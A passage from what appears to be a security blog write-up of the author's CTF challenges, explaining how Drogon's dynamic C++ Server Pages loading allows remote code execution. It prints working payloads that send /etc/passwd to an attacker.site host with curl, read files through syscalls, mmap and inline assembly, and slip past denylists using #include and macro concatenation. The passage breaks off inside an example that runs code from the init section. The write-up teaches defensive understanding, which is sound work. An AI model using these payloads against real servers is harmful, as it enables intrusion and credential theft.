<span class="token punctuation">}</span></code></pre><div class="toolbar"><div class="toolbar-item"><span>Example.cc</span></div><div class="toolbar-item"><span class="lang">C++</span></div></div></div><p><code>Example_tmp_stream</code> is a <a href="https://stackoverflow.com/a/20595061/10239789" rel="noreferrer" target="_blank">stringstream</a> used to prepare the final HTML. Eventually, it gets converted to a string and returned.</p></li><li><p><code>{% ... %}</code> - equivalent to <code>&lt;%c++ $$ &lt;&lt; ... %&gt;</code>, it just echoes the expression. The closing <code>%}</code> must be on the same line as the opening <code>{%</code>.</p></li><li><p><code>&lt;%inc ... %&gt;</code> - meant for including additional libraries. Code is placed in file-level scope.</p><div class="code-toolbar"><pre data-label="Example.csp" class="language-csp" tabindex="0"><code class="language-csp"><span class="token operator">&lt;</span><span class="token operator">%</span>inc
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;algorithm&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MY_MACRO</span></span>
<span class="token keyword">void</span> <span class="token function">my_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
<span class="token operator">%</span><span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>h1<span class="token operator">&gt;</span>Example<span class="token operator">&lt;</span><span class="token operator">/</span>h1<span class="token operator">&gt;</span></code></pre><div class="toolbar"><div class="toolbar-item"><span>Example.csp</span></div><div class="toolbar-item"><span class="lang">C++ Server Pages</span></div><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div><div class="code-toolbar"><pre data-label="Example.cc" data-copy-off="" class="language-cpp" tabindex="0"><code class="language-cpp"><span class="token comment">// Boilerplate: includes...</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;algorithm&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MY_MACRO</span></span>
<span class="token keyword">void</span> <span class="token function">my_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>

<span class="token keyword">using</span> <span class="token keyword">namespace</span> drogon<span class="token punctuation">;</span>
std<span class="token double-colon punctuation">::</span>string <span class="token class-name">Example</span><span class="token double-colon punctuation">::</span><span class="token function">genText</span><span class="token punctuation">(</span><span class="token keyword">const</span> DrTemplateData<span class="token operator">&amp;</span> Example_view_data<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    drogon<span class="token double-colon punctuation">::</span>OStringStream Example_tmp_stream<span class="token punctuation">;</span>
    std<span class="token double-colon punctuation">::</span>string layoutName<span class="token punctuation">{</span><span class="token string">""</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
    Example_tmp_stream <span class="token operator">&lt;&lt;</span> <span class="token string">"&lt;h1&gt;Example&lt;/h1&gt;\n"</span><span class="token punctuation">;</span>
    <span class="token comment">// Boilerplate: convert stream to string and return...</span>
<span class="token punctuation">}</span></code></pre><div class="toolbar"><div class="toolbar-item"><span>Example.cc</span></div><div class="toolbar-item"><span class="lang">C++</span></div></div></div></li><li><p><code>[[ ... ]]</code> - for inserting data passed from application code.</p><div class="code-toolbar"><pre data-label="Example.csp" class="language-csp" tabindex="0"><code class="language-csp"><span class="token operator">&lt;</span>h1<span class="token operator">&gt;</span>Hi <span class="token punctuation">[</span><span class="token punctuation">[</span>name<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">!</span><span class="token operator">&lt;</span><span class="token operator">/</span>h1<span class="token operator">&gt;</span></code></pre><div class="toolbar"><div class="toolbar-item"><span>Example.csp</span></div><div class="toolbar-item"><span class="lang">C++ Server Pages</span></div><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div><div class="code-toolbar"><pre data-label="Example.cc" data-copy-off="" class="language-cpp" tabindex="0"><code class="language-cpp"><span class="token comment">// ...</span>
Example_tmp_stream <span class="token operator">&lt;&lt;</span> <span class="token string">"&lt;h1&gt;Hi "</span><span class="token punctuation">;</span>
<span class="token punctuation">{</span>
    <span class="token keyword">auto</span> <span class="token operator">&amp;</span> val<span class="token operator">=</span>Example_view_data<span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>val<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token keyword">typeid</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        Example_tmp_stream<span class="token operator">&lt;&lt;</span><span class="token operator">*</span><span class="token punctuation">(</span>std<span class="token double-colon punctuation">::</span><span class="token generic-function"><span class="token function">any_cast</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">&gt;</span></span></span><span class="token punctuation">(</span><span class="token operator">&amp;</span>val<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>val<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token keyword">typeid</span><span class="token punctuation">(</span>std<span class="token double-colon punctuation">::</span>string<span class="token punctuation">)</span><span class="token operator">||</span>val<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token keyword">typeid</span><span class="token punctuation">(</span><span class="token keyword">const</span> std<span class="token double-colon punctuation">::</span>string<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        Example_tmp_stream<span class="token operator">&lt;&lt;</span><span class="token operator">*</span><span class="token punctuation">(</span>std<span class="token double-colon punctuation">::</span><span class="token generic-function"><span class="token function">any_cast</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token keyword">const</span> std<span class="token double-colon punctuation">::</span>string<span class="token operator">&gt;</span></span></span><span class="token punctuation">(</span><span class="token operator">&amp;</span>val<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
Example_tmp_stream <span class="token operator">&lt;&lt;</span> <span class="token string">"!&lt;/h1&gt;\n"</span><span class="token punctuation">;</span>
<span class="token comment">// ...</span></code></pre><div class="toolbar"><div class="toolbar-item"><span>Example.cc</span></div><div class="toolbar-item"><span class="lang">C++</span></div></div></div></li></ul><h2 id="attack-vectors" tabindex="-1"><a class="md-anchor" href="#attack-vectors" aria-hidden="true"></a> Attack Vectors</h2><p>There are countless attack vectors to address.</p><ol><li><strong>RCE via Rendered CSP.</strong> First, we'll start by looking at a simple PoC which triggers RCE when the view is rendered.</li><li><strong>Bypasses.</strong> We'll survey common functions and tricks to bypass a denylist.</li><li><strong>RCE via Init Section.</strong> Here, we'll trigger RCE without rendering the view.</li><li><strong>RCE via File Name.</strong> Finally, we'll discuss a harrowing insecurity in the DVL code path.</li></ol><p>Not all of these were exploitable in my CTF chals. I selected a few vectors which I thought were interesting.</p><h3 id="1-rce-via-rendered-csp" tabindex="-1"><a class="md-anchor" href="#1-rce-via-rendered-csp" aria-hidden="true"></a> 1. RCE via Rendered CSP</h3><p>Suppose an attacker can write any CSP content in the dynamic views path. In the simplest case where filtering or checking is non-existent, the attacker can execute malicious commands using the usual <code>system</code> and <code>execve</code> functions found in libc. This allows us to exfiltrate sensitive information and launch reverse shells.</p><div class="code-toolbar"><pre data-label="Example.csp" class="language-csp" tabindex="0"><code class="language-csp"><span class="token operator">&lt;</span><span class="token operator">%</span>c<span class="token operator">++</span>
    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"curl http://attacker.site --data @/etc/passwd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">%</span><span class="token operator">&gt;</span></code></pre><div class="toolbar"><div class="toolbar-item"><span>Example.csp</span></div><div class="toolbar-item"><span class="lang">C++ Server Pages</span></div><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div><p>To trigger this RCE, the application code needs to render the view with <code class="language-cpp"><span class="token class-name">HttpResponse</span><span class="token double-colon punctuation">::</span><span class="token function">newHttpViewResponse</span><span class="token punctuation">(</span><span class="token string">"Example.csp"</span><span class="token punctuation">)</span></code>.</p><p>The following diagram shows where code execution occurs along the pipeline. We'll update the diagram as we explore other vectors.</p><p><a class="lightbox-single" title="Vanilla RCE with Drogon DVL: we can execute code with `<%c++`." href="/img/posts/infosec/drogon-csp/assets/drogon-dynamic-view-loading-exec-on-render-516w.webp"><img class="mb-2 rw center jw-60 alpha-imgv" src="/img/posts/infosec/drogon-csp/assets/drogon-dynamic-view-loading-exec-on-render-516w.webp" loading="lazy" decoding="async" style="aspect-ratio: auto 516 / 564" alt="Vanilla RCE with Drogon DVL: we can execute code with `<%c++`." title="Vanilla RCE with Drogon DVL: we can execute code with `<%c++`." srcset="/img/posts/infosec/drogon-csp/assets/drogon-dynamic-view-loading-exec-on-render-256w.webp 256w, /img/posts/infosec/drogon-csp/assets/drogon-dynamic-view-loading-exec-on-render-512w.webp 512w, /img/posts/infosec/drogon-csp/assets/drogon-dynamic-view-loading-exec-on-render-516w.webp 516w" sizes="(max-width: 256px) 256px, (max-width: 512px) 512px, 516px"></a></p><p class="caption"><sup>A simple and direct method of abusing CSPs. Execution occurs when the view is rendered, e.g. by calling <code>newHttpViewResponse</code>.</sup></p><h3 id="2-bypassing-simple-denylists" tabindex="-1"><a class="md-anchor" href="#2-bypassing-simple-denylists" aria-hidden="true"></a> 2. Bypassing Simple Denylists</h3><p>If the loophole resides in a few key functions, can't we simply block those functions?</p><p>No. This is extremely difficult in a diverse language such as C++. Not only does it have its own language features and standard library; but it also inherits most of C's baggage. There are <em>many</em> ways to bypass a denylist. As such, a sufficiently secure denylist will either be exhaustively long or severely limiting.</p><div class="alert alert-success d-flex align-items-start"><i class="fas fa-lightbulb ms-1 me-3 mt-1 fs-4" role="img"></i><div class="alert-content flex-fill mt-0"><p>This goes to show how denylists (blacklists) are generally discouraged from a security PoV, as it's difficult to account for all methods of bypass. In the case of programming languages, however, allowlists (whitelists) are also difficult to construct, as limiting ourselves to a set of tokens severely constrict the realm of possible CSP programs, and may hinder development.<sup class="footnote-ref"><a href="#fn3" id="fnref3">3</a></sup></p><p>The only solution, really, is to not enable DVLs. More on mitigations later.</p></div></div><p>A sufficient denylist needs to consider the following approaches, similar to any C/C++ denylist-bypass challenge. The actual denylist has been left as an exercise for the reader.</p><h4 id="file-read-write-with-fstream-fopen" tabindex="-1"><a class="md-anchor" href="#file-read-write-with-fstream-fopen" aria-hidden="true"></a> File Read/Write with <code>fstream</code>, <code>fopen</code></h4><div class="code-toolbar"><pre class="language-csp" tabindex="0"><code class="language-csp"><span class="token operator">&lt;</span><span class="token operator">%</span>inc
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fstream&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sstream&gt;</span></span>
<span class="token operator">%</span><span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">%</span>c<span class="token operator">++</span>
    std<span class="token double-colon punctuation">::</span>ifstream ifs<span class="token punctuation">{</span><span class="token string">"/etc/passwd"</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>ifs<span class="token punctuation">.</span><span class="token function">is_open</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        $$ <span class="token operator">&lt;&lt;</span> ifs<span class="token punctuation">.</span><span class="token function">rdbuf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        $$ <span class="token operator">&lt;&lt;</span> <span class="token string">"Failed to open file."</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token operator">%</span><span class="token operator">&gt;</span></code></pre><div class="toolbar"><div class="toolbar-item"><span class="lang">C++ Server Pages</span></div><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div><h4 id="file-read-write-with-open-read" tabindex="-1"><a class="md-anchor" href="#file-read-write-with-open-read" aria-hidden="true"></a> File Read/Write with <code>open</code>, <code>read</code></h4><p>If high-level file IO isn't an option, we could always resort to the lower-level Linux functions.</p><div class="code-toolbar"><pre class="language-csp" tabindex="0"><code class="language-csp"><span class="token operator">&lt;</span><span class="token operator">%</span>inc
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h&gt;</span></span>
<span class="token operator">%</span><span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">%</span>c<span class="token operator">++</span>
    <span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">99</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
    <span class="token function">read</span><span class="token punctuation">(</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/etc/passwd"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> buffer<span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    $$ <span class="token operator">&lt;&lt;</span> buffer<span class="token punctuation">;</span>
<span class="token operator">%</span><span class="token operator">&gt;</span></code></pre><div class="toolbar"><div class="toolbar-item"><span class="lang">C++ Server Pages</span></div><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div><h4 id="file-read-write-rce-with-syscall" tabindex="-1"><a class="md-anchor" href="#file-read-write-rce-with-syscall" aria-hidden="true"></a> File Read/Write, RCE with <code>syscall</code></h4><p>We can go one level deeper using the <code>syscall()</code> function. This allows us to call the usual <code>open</code>, <code>read</code>, <code>write</code>, <code>execve</code> syscalls, albeit less readably.</p><div class="code-toolbar"><pre class="language-csp" tabindex="0"><code class="language-csp"><span class="token operator">&lt;</span><span class="token operator">%</span>inc
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h&gt;</span></span>
<span class="token operator">%</span><span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">%</span>c<span class="token operator">++</span>
    <span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">99</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
    <span class="token function">syscall</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">syscall</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"/etc/passwd"</span><span class="token punctuation">,</span> <span class="token number">0</span>       <span class="token punctuation">)</span><span class="token punctuation">,</span> buffer<span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//  read(      open(      "/etc/passwd", O_RDONLY), buffer, 99);</span>
    $$ <span class="token operator">&lt;&lt;</span> buffer<span class="token punctuation">;</span>
<span class="token operator">%</span><span class="token operator">&gt;</span></code></pre><div class="toolbar"><div class="toolbar-item"><span class="lang">C++ Server Pages</span></div><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div><p>Thanks to syscall 59, we can also run <code>execve</code> to achieve RCE.</p><div class="code-toolbar"><pre class="language-csp" tabindex="0"><code class="language-csp"><span class="token operator">&lt;</span><span class="token operator">%</span>inc
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h&gt;</span></span>
<span class="token operator">%</span><span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">%</span>c<span class="token operator">++</span>
    <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string">"/usr/bin/curl"</span><span class="token punctuation">,</span>
        <span class="token string">"http://attacker.site"</span><span class="token punctuation">,</span>
        <span class="token string">"--data"</span><span class="token punctuation">,</span>
        <span class="token string">"@/etc/passwd"</span><span class="token punctuation">,</span>
        <span class="token constant">NULL</span>
    <span class="token punctuation">}</span><span class="token punctuation">;</span>
    <span class="token function">syscall</span><span class="token punctuation">(</span><span class="token number">59</span><span class="token punctuation">,</span> <span class="token string">"/usr/bin/curl"</span><span class="token punctuation">,</span> argv<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">%</span><span class="token operator">&gt;</span></code></pre><div class="toolbar"><div class="toolbar-item"><span class="lang">C++ Server Pages</span></div><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div><p>Handy Reference: <a href="https://filippo.io/linux-syscall-table/" rel="noreferrer" target="_blank">Linux x86 Syscalls - filippo.io</a></p><h4 id="file-read-with-mmap" tabindex="-1"><a class="md-anchor" href="#file-read-with-mmap" aria-hidden="true"></a> File Read with <code>mmap</code></h4><p>After opening and creating a file descriptor via <code>open</code> or <code>syscall(2, ...)</code>, we can also use <code>mmap</code> to perform a read instead of the usual <code>read</code>.</p><div class="code-toolbar"><pre class="language-csp" tabindex="0"><code class="language-csp"><span class="token operator">&lt;</span><span class="token operator">%</span>inc
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/mman.h&gt;</span></span>
<span class="token operator">%</span><span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">%</span>c<span class="token operator">++</span>
    $$ <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">mmap</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token function">syscall</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">"/etc/passwd"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// mmap(addr, length, memory_protection, flags, fd, offset)</span>
<span class="token operator">%</span><span class="token operator">&gt;</span></code></pre><div class="toolbar"><div class="toolbar-item"><span class="lang">C++ Server Pages</span></div><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div><h4 id="file-read-write-rce-via-inline-assembly" tabindex="-1"><a class="md-anchor" href="#file-read-write-rce-via-inline-assembly" aria-hidden="true"></a> File Read/Write, RCE via Inline Assembly</h4><p>Pretty much any syscall in C can be translated to assembly, and GCC's extended assembly makes it convenient to pass input and output.</p><p>The following CSP opens and reads <code>/etc/passwd</code> into a buffer, then outputs it. This is equivalent to the open-read idiom we used above.</p><div class="code-toolbar"><pre class="language-csp" tabindex="0"><code class="language-csp"><span class="token operator">&lt;</span><span class="token operator">%</span>c<span class="token operator">++</span>
    <span class="token keyword">char</span> file<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"/etc/passwd"</span><span class="token punctuation">,</span> buffer<span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token raw-string string">R"(
        mov $2, %%rax;
        lea (%0), %%rdi;
        mov $0, %%rsi;
        syscall;
        
        mov %%rax, %%rdi;
        mov $0, %%rax;
        lea (%1), %%rsi;
        mov $255, %%rdx;
        syscall
    )"</span>
        <span class="token operator">:</span> <span class="token operator">:</span> <span class="token string">"b"</span> <span class="token punctuation">(</span> file <span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"d"</span> <span class="token punctuation">(</span> buffer <span class="token punctuation">)</span>
    <span class="token punctuation">)</span><span class="token punctuation">;</span>
    $$ <span class="token operator">&lt;&lt;</span> buffer<span class="token punctuation">;</span>
<span class="token operator">%</span><span class="token operator">&gt;</span></code></pre><div class="toolbar"><div class="toolbar-item"><span class="lang">C++ Server Pages</span></div><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div><p><code>"b" ( file )</code> and <code>"d" ( buffer )</code> are inputs to our asm procedure. The letters <code>b</code> and <code>d</code> refer to the <code>%rbx</code> and <code>%rdx</code> register. I chose these registers specifically to avoid conflicts. (<code>%rax</code> gets written with <code>2</code> on the first line, <code>%rcx</code> gets overwritten by the first syscall.)</p><p>Exercises for the reader:</p><ul><li>Try to figure out how the assembly maps to the C syscalls in the previous sections.</li><li><code>buffer</code> is technically an output, so why do we treat it as an input?</li><li>Demonstrate RCE by using the execve syscall.</li></ul><p>Blocking the keyword <code>syscall</code> will not work here. We can bypass it with a simple <code>sys" "call</code>, since adjacent strings are concatenated in C/C++ (<code>"a" "b" == "ab"</code>). To properly block such calls, we would need to block the functions invoking inline assembly, such as <code>asm</code>.</p><p>Handy Reference: <a href="https://www.codeproject.com/Articles/15971/Using-Inline-Assembly-in-C-C" rel="noreferrer" target="_blank">Using Inline Assembly in C/C++</a></p><h4 id="local-file-inclusion-with-include" tabindex="-1"><a class="md-anchor" href="#local-file-inclusion-with-include" aria-hidden="true"></a> Local File Inclusion with <code>#include</code></h4><p>Filters applied to a set of file extensions can be easily bypassed by uploading a file with an unfiltered extension, then <code>#include</code>-ing it in the CSP. All <code>#include</code> really does is copy-paste the included file's content, which then gets compiled as C/C++ code.</p><ul><li><p>Example.csp - with stringent checks on denied words.</p><div class="code-toolbar"><pre data-label="Example.csp" class="language-csp" tabindex="0"><code class="language-csp"><span class="token operator">&lt;</span><span class="token operator">%</span>inc #include <span class="token string">"safe.txt"</span> <span class="token operator">%</span><span class="token operator">&gt;</span></code></pre><div class="toolbar"><div class="toolbar-item"><span>Example.csp</span></div><div class="toolbar-item"><span class="lang">C++ Server Pages</span></div><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div></li><li><p>safe.txt - other C++ code which gets a free pass, possibly using a technique above.</p><div class="code-toolbar"><pre data-label="safe.txt" class="language-cpp" tabindex="0"><code class="language-cpp"><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"curl http://attacker.site --data @/etc/passwd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><div class="toolbar"><div class="toolbar-item"><span>safe.txt</span></div><div class="toolbar-item"><span class="lang">C++</span></div><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div></li></ul><p>This allows us to bypass situations where, say, .csp files are strictly checked, but certain extensions are not checked at all.</p><p>I'll admit this one slipped my mind; quite a few players discovered this unintended solution during the CTF.</p><h4 id="bypass-denylists-with-macro-token-concatenation" tabindex="-1"><a class="md-anchor" href="#bypass-denylists-with-macro-token-concatenation" aria-hidden="true"></a> Bypass Denylists with Macro Token Concatenation (<code>##</code>)</h4><p>C/C++ macros have some quirky features:</p><ul><li><p><code>#</code>: Converts a macro argument's value to a string.</p><div class="code-toolbar"><pre class="language-cpp" tabindex="0"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">STR</span><span class="token expression"><span class="token punctuation">(</span>X<span class="token punctuation">)</span> #X</span></span>
<span class="token comment">// STR(abc) == "abc"</span></code></pre><div class="toolbar"><div class="toolbar-item"><span class="lang">C++</span></div><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div></li><li><p><code>##</code>: Joins two arguments.</p><div class="code-toolbar"><pre class="language-cpp" tabindex="0"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">GLUE</span><span class="token expression"><span class="token punctuation">(</span>X<span class="token punctuation">,</span> Y<span class="token punctuation">)</span> X </span><span class="token punctuation">##</span> <span class="token expression">Y</span></span>
<span class="token function">GLUE</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> out<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token string">"hello world!"</span> <span class="token operator">&lt;&lt;</span> <span class="token function">GLUE</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span> ndl<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// cout &lt;&lt; "hello world!" &lt;&lt; endl;</span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">GLUE2</span><span class="token expression"><span class="token punctuation">(</span>X<span class="token punctuation">)</span> X </span><span class="token punctuation">##</span> <span class="token expression">_literally</span></span>
<span class="token keyword">int</span> <span class="token function">GLUE2</span><span class="token punctuation">(</span>var<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment">// int var_literally = 1;</span></code></pre><div class="toolbar"><div class="toolbar-item"><span class="lang">C++</span></div><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div></li></ul><p>The second feature allows us to bypass denylists which only match full words.</p><p>For instance, if a denylist blocks <code>system</code>, we can do <code>GLUE(s, ystem)</code>.</p><div class="code-toolbar"><pre class="language-csp" tabindex="0"><code class="language-csp"><span class="token operator">&lt;</span><span class="token operator">%</span>inc #define <span class="token function">GLUE</span><span class="token punctuation">(</span>X<span class="token punctuation">,</span> Y<span class="token punctuation">)</span> X ## Y <span class="token operator">%</span><span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">%</span>c<span class="token operator">++</span>
    <span class="token function">GLUE</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> ystem<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">"curl http://attacker.site --data @/etc/passwd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">%</span><span class="token operator">&gt;</span></code></pre><div class="toolbar"><div class="toolbar-item"><span class="lang">C++ Server Pages</span></div><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div><h3 id="3-rce-via-init-section" tabindex="-1"><a class="md-anchor" href="#3-rce-via-init-section" aria-hidden="true"></a> 3. RCE via Init Section</h3><p>The previous tricks use <code>&lt;%c++</code> which only executes when the view is rendered. But what if I told you we can execute code <em>without even rendering the view</em>?</p><p>That's right, all we need is to load the .so to execute code!</p><p><a class="lightbox-single" title="Code can be executed right after loading the .so binary." href="/img/posts/infosec/drogon-csp/assets/drogon-dynamic-view-loading-exec-on-init-457w.webp"><img class="mb-2 rw center jw-60 alpha-imgv" src="/img/posts/infosec/drogon-csp/assets/drogon-dynamic-view-loading-exec-on-init-457w.webp" loading="lazy" decoding="async" style="aspect-ratio: auto 457 / 564" alt="Code can be executed right after loading the .so binary." title="Code can be executed right after loading the .so binary." srcset="/img/posts/infosec/drogon-csp/assets/drogon-dynamic-view-loading-exec-on-init-256w.webp 256w, /img/posts/infosec/drogon-csp/assets/drogon-dynamic-view-loading-exec-on-init-457w.webp 457w" sizes="(max-width: 256px) 256px, 457px"></a></p><p class="caption"><sup>Using <code>&lt;%c++</code> will execute code when "View is Rendered", but by strategically placing code in the <code>.init</code> section of the binary, we can get code to execute right after loading the .so!</sup></p><p>Let's look at a few examples of how we can achieve this tomfoolery.</p><h4 id="init-section-via-inc" tabindex="-1"><a class="md-anchor" href="#init-section-via-inc" aria-hidden="true"></a> Init Section via <code>&lt;%inc</code></h4><p>There are various ways to run code prior to <code>main()</code>. We can make use of the fact that <code>&lt;%inc</code> places code in file scope.</p><div class="code-toolbar"><pre class="language-csp" tabindex="0"><code class="language-csp"><span class="token operator">&lt;</span><span class="token operator">%</span>inc
<span class="token comment">// 1. Assign variable with function call.</span>
<span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"curl http://attacker.site --data @/etc/passwd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// 2. To run more code, we can create a function first.</span>
<span class="token keyword">int</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"curl http://attacker.site --data @/etc/passwd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">int</span> b <span class="token operator">=</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// 3. GCC attributes - gets called automatically.</span>
<span class="token function">__attribute__</span><span class="token punctuation">(</span><span class="token punctuation">(</span>constructor<span class="token punctuation">)</span><span class="token punctuation">)</span>
